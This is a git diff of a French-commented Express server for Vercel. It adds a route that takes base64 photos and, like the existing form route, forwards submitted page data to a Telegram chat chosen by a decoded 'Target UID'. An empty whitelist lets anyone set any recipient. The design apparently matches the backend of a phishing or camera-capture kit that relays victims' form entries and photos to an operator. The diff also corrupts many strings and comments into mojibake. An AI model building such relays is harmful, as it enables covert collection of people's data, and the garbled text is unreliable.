@@ -1,14 +1,16 @@
- 
+
+
 // api/server.js
 // Version compatible avec Vercel (export via module.exports)
 
 const express = require("express");
 const bodyParser = require("body-parser");
 const fetch = require("node-fetch");
+const FormData = require("form-data");
 require("dotenv").config();
 
 const app = express();
-app.use(bodyParser.json());
+app.use(bodyParser.json({ limit: '10mb' })); // âš ï¸ Important pour les photos en base64
 
 // --- Config
 const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
@@ -56,7 +58,7 @@ function requireApiKeyMiddleware(req, res, next) {
 const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || "*";
 app.use((req, res, next) => {
   res.setHeader("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
-  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type, X-API-KEY");
   if (req.method === "OPTIONS") return res.status(200).end();
   next();
@@ -66,16 +68,16 @@ app.use((req, res, next) => {
 function isUidWhitelisted(uid) {
   const raw = process.env.WHITELIST || "";
   
-  // ✅ CORRECTION : Whitelist vide = tous les UID autorisés
+  // âœ… Whitelist vide = tous les UID autorisÃ©s
   if (!raw.trim()) {
-    console.log("✅ Whitelist vide - UID", uid, "autorisé");
+    console.log("âœ… Whitelist vide - UID", uid, "autorisÃ©");
     return true;
   }
   
-  // Whitelist non vide = vérifier l'UID
+  // Whitelist non vide = vÃ©rifier l'UID
   const list = raw.split(",").map(s => s.trim()).filter(Boolean);
   const isAllowed = list.includes(String(uid));
-  console.log("🔍 Whitelist check - UID:", uid, "Autorisé:", isAllowed, "Liste:", list);
+  console.log("ðŸ” Whitelist check - UID:", uid, "AutorisÃ©:", isAllowed, "Liste:", list);
   return isAllowed;
 }
 
@@ -125,7 +127,7 @@ app.post("/api/submit", async (req, res) => {
   let uid;
   try {
     uid = String(decodeCode(String(code)));
-    console.log("🔑 Code décodé:", code, "→ UID:", uid);
+    console.log("ðŸ”‘ Code dÃ©codÃ©:", code, "â†’ UID:", uid);
   } catch {
     return res.status(400).send("invalid code");
   }
@@ -134,7 +136,7 @@ app.post("/api/submit", async (req, res) => {
   const requiredKey = process.env.API_KEY || "";
   const isOwnerCall = requiredKey && providedKey === requiredKey;
 
-  console.log("🔐 Check sécurité - UID:", uid, "OwnerCall:", isOwnerCall, "Whitelisted:", isUidWhitelisted(uid));
+  console.log("ðŸ” Check sÃ©curitÃ© - UID:", uid, "OwnerCall:", isOwnerCall, "Whitelisted:", isUidWhitelisted(uid));
 
   if (!isOwnerCall && !isUidWhitelisted(uid)) {
     return res.status(403).send("Target UID not allowed");
@@ -146,7 +148,7 @@ app.post("/api/submit", async (req, res) => {
 
   const clean = (s) => escapeHtml(String(s || ""));
   const lines = Object.entries(form)
-    .map(([k, v]) => `• <b>${clean(k)}:</b> ${clean(v)}`)
+    .map(([k, v]) => `â€¢ <b>${clean(k)}:</b> ${clean(v)}`)
     .join("\n");
 
   const botToken = process.env.TELEGRAM_TOKEN;
@@ -155,7 +157,7 @@ app.post("/api/submit", async (req, res) => {
   const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
   const text = `<b>Page :</b> ${clean(source || "unknown")}\n<b>UID :</b> ${clean(uid)}\n\n<b>Formulaire :</b>\n${lines}`;
 
-  console.log("📤 Envoi à Telegram - UID:", uid);
+  console.log("ðŸ“¤ Envoi Ã  Telegram - UID:", uid);
 
   try {
     const resp = await fetch(telegramUrl, {
@@ -171,20 +173,87 @@ app.post("/api/submit", async (req, res) => {
 
     const j = await resp.json();
     if (!resp.ok || !j.ok) {
-      console.error("❌ Telegram API error:", j);
+      console.error("âŒ Telegram API error:", j);
       return res.status(502).send("Telegram API error");
     }
 
-    console.log("✅ Message envoyé à Telegram");
-    return res.status(200).send("Formulaire envoyé ✅");
+    console.log("âœ… Message envoyÃ© Ã  Telegram");
+    return res.status(200).send("Formulaire envoyÃ© âœ…");
   } catch (err) {
-    console.error("❌ Network error:", err);
+    console.error("âŒ Network error:", err);
+    return res.status(502).send("Network error");
+  }
+});
+
+// âœ… Submit photo (nouvelle route)
+app.post("/api/submit-photo", async (req, res) => {
+  const { code, source, photo } = req.body || {};
+  
+  if (!code || !photo) {
+    return res.status(400).send("code or photo missing");
+  }
+
+  let uid;
+  try {
+    uid = String(decodeCode(String(code)));
+    console.log("ðŸ”‘ Code dÃ©codÃ©:", code, "â†’ UID:", uid);
+  } catch {
+    return res.status(400).send("invalid code");
+  }
+
+  const providedKey = String(req.headers["x-api-key"] || "");
+  const requiredKey = process.env.API_KEY || "";
+  const isOwnerCall = requiredKey && providedKey === requiredKey;
+
+  console.log("ðŸ” Check sÃ©curitÃ© photo - UID:", uid, "OwnerCall:", isOwnerCall, "Whitelisted:", isUidWhitelisted(uid));
+
+  if (!isOwnerCall && !isUidWhitelisted(uid)) {
+    return res.status(403).send("Target UID not allowed");
+  }
+
+  if (!checkRateLimit(uid)) {
+    return res.status(429).send("Too many requests (rate limit)");
+  }
+
+  const botToken = process.env.TELEGRAM_TOKEN;
+  if (!botToken) return res.status(500).send("Server misconfigured");
+
+  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+  
+  // Convertir base64 en buffer
+  const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
+  const buffer = Buffer.from(base64Data, 'base64');
+
+  console.log("ðŸ“¤ Envoi photo Ã  Telegram - UID:", uid, "Taille:", Math.round(buffer.length / 1024), "KB");
+
+  try {
+    const form = new FormData();
+    form.append('chat_id', uid);
+    form.append('photo', buffer, { filename: 'photo.jpg' });
+    if (source) form.append('caption', `ðŸ“¸ ${source}`);
+
+    const resp = await fetch(telegramUrl, {
+      method: "POST",
+      body: form,
+      headers: form.getHeaders(),
+    });
+
+    const j = await resp.json();
+    if (!resp.ok || !j.ok) {
+      console.error("âŒ Telegram API error:", j);
+      return res.status(502).send("Telegram API error");
+    }
+
+    console.log("âœ… Photo envoyÃ©e Ã  Telegram");
+    return res.status(200).send("Photo envoyÃ©e âœ…");
+  } catch (err) {
+    console.error("âŒ Network error:", err);
     return res.status(502).send("Network error");
   }
 });
 
 // Default route
-app.get("/api", (req, res) => res.send("API ready ✅"));
+app.get("/api", (req, res) => res.send("API ready âœ…"));
 
-// ✅ Export pour Vercel
+// âœ… Export pour Vercel
 module.exports = app;
